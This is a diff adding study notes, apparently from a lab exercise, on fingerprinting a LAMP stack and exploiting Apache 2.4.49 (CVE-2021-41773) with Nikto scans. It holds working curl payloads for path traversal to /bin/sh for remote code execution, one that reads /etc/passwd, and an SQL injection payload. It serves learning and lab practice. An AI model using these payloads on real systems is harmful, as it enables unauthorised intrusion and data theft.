@@ -126,3 +126,93 @@ sql = (
     ```
     curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
     ```
+
+
+# LAMP
+- LAMP(Linux, Apache, MySQL,PHP) is one of the earliest and most widely adopted web application stacks
+- It became popular because all its components are open-source, stable, and easy to deploy
+- Linux provides OS, Apache handles web requests, MySQL manages the database, and PHP processes dynamic content
+
+## Stack Identity
+- On Ubuntu, Apache runs under **www-data**, serves files from **/var/www/html**, and passes dynamic requests to PHP through **mod_php** or **PHP-FPM**
+- This classic LAMP combination creates common attack surfaces like exposed
+    - PHP files
+    - database errors
+    - weak file permissions
+    - misconfigured Apache/PHP settings
+
+## Fingerprinting the LAMP Stack
+- Start with header check
+    ```
+    curl -I http://machine_ip:8080/
+    ```
+    - Apache also repeats version in 404 error page footers. Request nonexistent path to confirm
+        ```
+        curl -v http://10.48.142.230:8080/nonexistent 2>&1
+        ```
+    - The final signal is **/cgi-bin/**
+    - 403 forbidden means directory exists, and listing is disabled
+    - 404 mean it is not present at all
+    - For this exploit, **mod_cgi** is required
+        ```
+        curl -v http://machine_ip:8080/cgi-bin/ 2>&1
+        ```
+
+## CVE-2021-41773: The Vulnerability
+- Apache 2.4.49 introduced a change to **ap_normalize_path()** function
+- This broke the path traversal filter
+- The bug is in decode order
+    - When you send **.%2e/**( a literal dor followed by URL encoded dot and a slash), the filter sees **.%2e/** and doesn't recognise it as **../** and bypassed filter
+
+- Why **--path-as-is** is required?
+    - curl normalises URLs before sending them
+    - Without **--path-as-is**, curl clean up **.%2e/** sequences before the request leaves your machine
+
+## Exploitation
+- you confirmed Apache 2.4.49 on port **8080**, with **mod_cgi** enabled on **/cgi-bin/**
+- you have a direct path to unauthenticated RCE
+1. Confirm Remote Code Execution
+    ```
+    curl -s --path-as-is "http://10.48.142.230:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
+    ```
+    - Traverse from **/cgi-bin/** up to **/bin/sh** using four **.%2e/** segments.
+    - The **echo Content-Type: text/plain; echo;** preamble is required by CGI spec
+    - Apache need valid HTTP header block before the body, or it returns a 500.
+    - Bare **echo** outputs the required blank separator line
+    - If Apache process is running as **daemon** RCE confirmed
+
+2. Read system accounts
+    ```
+    curl -s --path-as-is "http://10.48.142.230:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
+    ```
+    - The first non-root account is **daemon** account, which is the same user running the Apache process. This confirms the server is not running as root
+    
+
+
+# Automation
+- When working through a scope with many hosts, Nikto gives quick first pass; it probes each service, reads response headers, and surfaces stack signals and known misconfigurations without you writing a single payload
+## Scanning all four stacks
+1. Port 3000- MERN Stack
+    ```
+    nikto -h http://machine_ip:3000
+    ```
+2. Port 3001- Next.js
+    ```
+    nikto -h http://machine_ip:3001
+    ```
+3. Port 8000- Django
+    ```
+    nikto -h http://machine_ip:8000
+    ```
+4. Port 8080- Apache
+    ```
+    nikto -h http://machine_ip:8080
+    ```
+    - For MERN and Django, the stack is confirmed, but Nikto has no templates for application -level injection flaws. Thats where manual techniques for Next.js and Apache is required
+
+
+## CVE Summary
+1. MERN/Express- **CVE-2020-8203** - Impact(Prototype pollution- auth bypass) - 7.4 High
+2. Next.js- **CVE-2025-29927** - Single header Full middleware bypass - 9.1 Critical
+3. Django ORM- **CVE-2021-35042 - SQL injection via unparameterised ORDER BY - 9.8 Critical
+4. Apache LAMP- **CVE-2021-41773** - Path traversal + mod_cgi RCE - 9.8 Critical
